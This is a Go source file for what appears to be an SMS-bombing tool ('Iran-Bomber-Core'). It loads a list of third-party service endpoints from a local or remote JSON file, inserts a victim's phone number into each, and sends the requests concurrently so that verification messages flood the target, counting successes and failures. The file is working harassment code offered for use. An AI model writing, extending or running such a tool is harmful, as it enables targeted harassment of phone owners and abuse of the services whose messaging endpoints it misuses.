package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sync"

	"github.com/M-logique/Iran-Bomber-Core/bomber"
	"github.com/M-logique/Iran-Bomber-Core/utils"
)

const (
	APIURL = "https://m-logique.github.io/files/API.json"
)

func fetchAPI() (error, []interface{}) {
	resp, err := http.Get(APIURL)
	if err != nil {
		return err, nil
	}

	defer resp.Body.Close()

	var result map[string]interface{}
	if err = json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err, nil
	}

	return nil, result["APIs"].([]interface{})
}

func loadAPI(filePath string) (error, []interface{}) {
	fi, err := os.Open(filePath)

	if err != nil {
		return err, nil
	}

	defer fi.Close()

	var result map[string]interface{}

	if err = json.NewDecoder(fi).Decode(&result); err != nil {
		return err, nil
	}

	return nil, result["APIs"].([]interface{})

}

func sendAllMessages(phoneNumber string) {
	fmt.Println("Sending SMS")

	// err, result := fetchAPI()
	err, result := loadAPI("API.json")



	if err != nil {
		panic(err)
	}

	concurrencyLimit := 20  // Limit the number of concurrent requests
	sem := make(chan int, concurrencyLimit)
	var wg sync.WaitGroup
	var errCount int
	var successCount int

	for _, v := range result {
		j := utils.FormatJSON(v.(map[string]interface{}), phoneNumber).(map[string]interface{})
		name := j["name"].(string)
		url := j["url"].(string)
		method := j["method"].(string)
		var payload map[string]interface{}
		if j["payload"] != nil {
			payload = j["payload"].(map[string]interface{})
		}

		var data string

		if j["data"] != nil {
			data = j["data"].(string)
		}

		

		b := bomber.Bomber{}

		sem <- 69
		wg.Add(1)

		
		go func() {
			defer wg.Done()
			
			err, status := b.SetAPIURL(url).
				SetPayload(payload).
				SetData(data).
				SetMethod(method).
				SetTimeout(10).
				Send()
			<-sem

			fmt.Printf("Sent %s", name)
			if status.OK {
				fmt.Print(" successfully")
				successCount++
			} else {
				fmt.Printf(" but failed: %v", err)
				fmt.Printf(" with StatusCode: %d", status.StatusCode)
				errCount++
			}

			fmt.Print("\n")

			
			}()
		}
	
		// Wait for all goroutines to finish
		wg.Wait()
		fmt.Println("Messages sent: ", successCount)
		fmt.Println("Messages failed: ", errCount)

}

func contains(slice []string, item string) bool {
	for _, v := range slice {
		if v == item {
			return true
		}
	}
	return false
}

func main() {}

